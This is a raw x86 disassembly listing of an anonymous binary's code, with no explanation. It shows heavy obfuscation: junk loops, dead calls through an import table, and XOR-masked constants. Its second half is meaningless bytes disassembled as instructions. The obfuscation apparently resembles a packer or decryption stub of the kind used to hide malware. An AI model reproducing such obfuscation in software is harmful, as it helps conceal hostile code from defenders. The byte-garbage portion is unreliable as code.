  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237e2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a86
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423938
  41c5ea:	push   0x42389d
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423913
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x4238fe
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a34
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xf7d7ebdc
  41ccad:	sti    
  41ccae:	loope  0x41cc43
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x77]
  41ccb9:	imul   edx,DWORD PTR [edx],0xf190e28e
  41ccbf:	sbb    eax,0xd857acbe
  41ccc4:	inc    edi
  41ccc5:	adc    eax,edx
  41ccc7:	mov    ch,BYTE PTR ds:0x3f8fb94f
  41cccd:	in     eax,0x86
  41cccf:	or     ch,BYTE PTR [ebx-0x14f1a383]
  41ccd5:	inc    ecx
  41ccd6:	xor    BYTE PTR [edx],bh
  41ccd8:	push   edx
  41ccd9:	mov    esp,0xd4ab933d
  41ccde:	xor    DWORD PTR [esi],esp
  41cce0:	call   0xc3656119
  41cce5:	into   
  41cce6:	das    
  41cce7:	push   ebp
  41cce8:	out    0x54,al
  41ccea:	xchg   ecx,eax
  41cceb:	and    cl,BYTE PTR [ecx]
  41cced:	mov    ebx,0x9b51fd52
  41ccf2:	js     0x41cd2a
  41ccf4:	inc    eax
  41ccf5:	daa    
  41ccf6:	xor    al,0xd6
  41ccf8:	stc    
  41ccf9:	pop    ebp
  41ccfa:	xchg   esi,eax
  41ccfc:	inc    ecx
  41ccfd:	cmp    ecx,ebp
  41ccff:	mov    ds:0x569a77b1,al
  41cd04:	xor    eax,0xf9b49e64
  41cd09:	sbb    al,0x61
  41cd0b:	ds cmp eax,0x7c46f8c5
  41cd11:	sbb    eax,0xbf46cc2a
  41cd16:	push   cs
  41cd17:	inc    esi
  41cd18:	add    ecx,DWORD PTR [esi+eiz*1+0x26]
  41cd1c:	adc    ch,BYTE PTR [edx+edx*8]
  41cd1f:	dec    ebp
  41cd20:	shl    al,cl
  41cd22:	repz (bad) [edi]
  41cd25:	js     0x41ccb3
  41cd27:	dec    ecx
  41cd28:	shr    al,0x32
  41cd2b:	inc    edx
  41cd2c:	icebp  
  41cd2d:	stos   BYTE PTR es:[edi],al
  41cd2e:	outs   dx,BYTE PTR ds:[esi]
  41cd2f:	(bad)  
  41cd30:	xchg   ebx,eax
  41cd31:	(bad)  
  41cd32:	cdq    
  41cd33:	pop    ecx
  41cd34:	dec    edi
  41cd35:	xchg   DWORD PTR [ebp-0x3f9a5134],eax
  41cd3b:	loopne 0x41cce9
  41cd3d:	and    esp,DWORD PTR [ebx+0x42]
  41cd40:	fstp   TBYTE PTR fs:[ebx]
  41cd43:	mov    eax,ds:0x8df8b8c2
  41cd48:	jl     0x41cd4c
  41cd4a:	dec    esp
  41cd4b:	outs   dx,DWORD PTR ds:[esi]
  41cd4c:	js     0x41ccec
  41cd4e:	mov    ch,0x56
  41cd50:	in     al,dx
  41cd51:	je     0x41cd47
  41cd53:	ficom  WORD PTR [ebx]
  41cd55:	jmp    0x41cdc7
  41cd57:	lds    esi,FWORD PTR [edx+esi*8]
  41cd5a:	adc    BYTE PTR [eax],al
  41cd5c:	mov    al,0x5f
  41cd5e:	nop
  41cd5f:	xchg   edi,eax
  41cd60:	ja     0x41cd3c
  41cd62:	inc    edi
  41cd63:	mov    dl,0xf4
  41cd65:	mov    BYTE PTR [eax-0x3d03a1c0],0x57
  41cd6c:	mov    eax,ds:0x5fa8795
  41cd71:	ret    0x3d04
  41cd74:	xor    BYTE PTR [edx+0x23],bl
  41cd77:	pop    ebp
  41cd78:	push   ds
  41cd79:	mov    al,ds:0x8edddeda
  41cd7e:	mov    esp,0x61cb6943
  41cd83:	shr    bh,1
  41cd85:	ins    BYTE PTR es:[edi],dx
  41cd86:	sbb    ch,BYTE PTR [esi]
  41cd88:	or     DWORD PTR [eax+0x5c],esp
  41cd8b:	mov    dl,0xa1
  41cd8d:	adc    al,0x6b
  41cd8f:	mov    cl,BYTE PTR [ebp+0x70584303]
  41cd95:	int3   
  41cd96:	into   
  41cd97:	fisub  DWORD PTR [ecx+0x41]
  41cd9a:	mov    dl,BYTE PTR [edx-0xce1a341]
  41cda0:	lahf   
  41cda1:	jo     0x41cd29
  41cda3:	mov    BYTE PTR [ebx+0xd],dl
  41cda6:	push   esi
  41cda7:	jl     0x41cdb7
  41cda9:	cli    
  41cdaa:	add    ah,BYTE PTR [esp+ebp*1+0x2c32f45e]
  41cdb1:	mov    ebx,0x1e272854
  41cdb6:	iret   
  41cdb7:	sub    bh,BYTE PTR [ebp+eax*1+0x79]
  41cdbb:	jns    0x41ce04
  41cdbd:	xor    esp,DWORD PTR [ecx+edx*4]
  41cdc0:	adc    ecx,DWORD PTR ss:[edi+esi*1]
  41cdc4:	pop    ebp
  41cdc5:	pop    esp
  41cdc6:	cmp    DWORD PTR [edi+0x3],ebp
  41cdc9:	call   0xd54abb2a
  41cdce:	xlat   BYTE PTR ds:[ebx]
  41cdcf:	ficomp WORD PTR [ebp+0x9]
  41cdd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd3:	xchg   edx,eax
  41cdd4:	push   esi
  41cdd5:	cmp    DWORD PTR [ecx+0x3e],eax
  41cdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdd9:	xor    eax,0x687d6e27
  41cdde:	pop    ds
  41cddf:	in     eax,dx
  41cde0:	sbb    DWORD PTR [ecx],edx
  41cde2:	test   eax,0xad3413b6
  41cde7:	les    esi,FWORD PTR [edi]
  41cde9:	pop    cx
  41cdeb:	dec    esp
  41cdec:	adc    DWORD PTR [eax-0x31],ebp
  41cdef:	enter  0x2506,0xba
  41cdf3:	mov    bl,0x7e
  41cdf5:	leave  
  41cdf6:	sbb    BYTE PTR [ebx+0x4d],bh
  41cdf9:	lahf   
  41cdfa:	jg     0x41ce0e
  41cdfc:	pop    edx
  41cdfd:	and    eax,0xaf9e74b8
  41ce02:	xchg   edx,eax
  41ce03:	dec    esi
  41ce04:	pop    ds
  41ce05:	(bad)  
  41ce06:	jbe    0x41cdbd
